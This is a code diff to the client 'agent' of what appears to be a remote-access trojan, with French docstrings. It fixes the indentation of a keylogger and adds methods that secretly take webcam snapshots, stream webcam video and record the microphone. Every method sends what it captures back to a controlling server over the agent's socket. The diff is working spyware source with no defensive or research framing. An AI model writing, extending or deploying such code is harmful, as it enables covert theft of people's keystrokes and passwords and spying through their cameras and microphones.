@@ -222,34 +222,134 @@ class AgentClient:
             FileUtils.send_file(self.sock, "screenshot.png")
         except Exception as e:
             logger.debug("[agent] Error in screenshot %s", e)
+
     def _keylogger(self, duration: int):
-    """Enregistre les frappes clavier pendant `duration` secondes."""
-    import threading
-    try:
-        from pynput.keyboard import Listener
+        """Enregistre les frappes clavier pendant `duration` secondes."""
+        import threading
+        try:
+            from pynput.keyboard import Listener
 
-        keys = []
-        stop_event = threading.Event()
+            keys = []
+            stop_event = threading.Event()
 
-        def on_press(key):
-            try:
-                keys.append(key.char)
-            except AttributeError:
-                keys.append(f"[{key.name}]")
+            def on_press(key):
+                try:
+                    keys.append(key.char)
+                except AttributeError:
+                    keys.append(f"[{key.name}]")
 
-        listener = Listener(on_press=on_press)
-        listener.start()
-        stop_event.wait(timeout=duration)
-        listener.stop()
+            listener = Listener(on_press=on_press)
+            listener.start()
+            stop_event.wait(timeout=duration)
+            listener.stop()
 
-        output = "".join(keys).encode("utf-8")
-        self.sock.sendall(
-            b"DISPLAY\n" + str(len(output)).encode("utf-8") + b"\n" + output
-        )
-        logger.debug("[agent] Keylogger: %d keys captured", len(keys))
-    except Exception as e:
-        logger.debug("[agent] Keylogger error: %s", e)
-        
+            output = "".join(keys).encode("utf-8")
+            self.sock.sendall(
+                b"DISPLAY\n" + str(len(output)).encode("utf-8") + b"\n" + output
+            )
+            logger.debug("[agent] Keylogger: %d keys captured", len(keys))
+        except Exception as e:
+            logger.debug("[agent] Keylogger error: %s", e)
+            
+    def _webcam_snapshot(self):
+        """Prend une photo via la webcam et l'envoie au serveur."""
+        try:
+            import cv2
+
+            cap = cv2.VideoCapture(0)
+            ret, frame = cap.read()
+            cap.release()
+
+            if not ret:
+                self._send_line("ERROR: webcam capture failed")
+                return
+
+            filepath = "webcam_snapshot.png"
+            cv2.imwrite(filepath, frame)
+            FileUtils.send_file(self.sock, filepath)
+
+            import os
+            os.remove(filepath)
+            logger.debug("[agent] Webcam snapshot sent")
+        except Exception as e:
+            logger.debug("[agent] Webcam snapshot error: %s", e)
+            
+    def _webcam_stream(self, duration: int):
+        """Envoie des frames de la webcam pendant `duration` secondes."""
+        try:
+            import cv2
+            import struct
+            import time
+
+            cap = cv2.VideoCapture(0)
+            if not cap.isOpened():
+                self._send_line("ERROR: webcam not available")
+                return
+
+            end_time = time.time() + duration
+
+            while time.time() < end_time:
+                ret, frame = cap.read()
+                if not ret:
+                    break
+
+                _, buf = cv2.imencode(".jpg", frame)
+                data = buf.tobytes()
+
+                # Protocole: FRAME\n<size>\n<data>
+                header = b"FRAME\n" + str(len(data)).encode("utf-8") + b"\n"
+                self.sock.sendall(header + data)
+                time.sleep(0.1)  # ~10 FPS
+
+            cap.release()
+            # Signal de fin
+            self.sock.sendall(b"STREAM_END\n")
+            logger.debug("[agent] Webcam stream ended")
+        except Exception as e:
+            logger.debug("[agent] Webcam stream error: %s", e)
+            
+    def _record_audio(self, duration: int):
+        """Enregistre l'audio du micro pendant `duration` secondes."""
+        try:
+            import pyaudio
+            import wave
+
+            chunk = 1024
+            fmt = pyaudio.paInt16
+            channels = 1
+            rate = 44100
+            filepath = "recorded_audio.wav"
+
+            p = pyaudio.PyAudio()
+            stream = p.open(
+                format=fmt, channels=channels,
+                rate=rate, input=True, frames_per_buffer=chunk
+            )
+
+            logger.debug("[agent] Recording audio for %d seconds...", duration)
+            frames = []
+            for _ in range(0, int(rate / chunk * duration)):
+                data = stream.read(chunk)
+                frames.append(data)
+
+            stream.stop_stream()
+            stream.close()
+            p.terminate()
+
+            with wave.open(filepath, "wb") as wf:
+                wf.setnchannels(channels)
+                wf.setsampwidth(p.get_sample_size(fmt))
+                wf.setframerate(rate)
+                wf.writeframes(b"".join(frames))
+
+            FileUtils.send_file(self.sock, filepath)
+
+            import os
+            os.remove(filepath)
+            logger.debug("[agent] Audio recording sent")
+        except Exception as e:
+            logger.debug("[agent] Record audio error: %s", e)
+
     def close(self):
         self.running = False
         if self.sock:
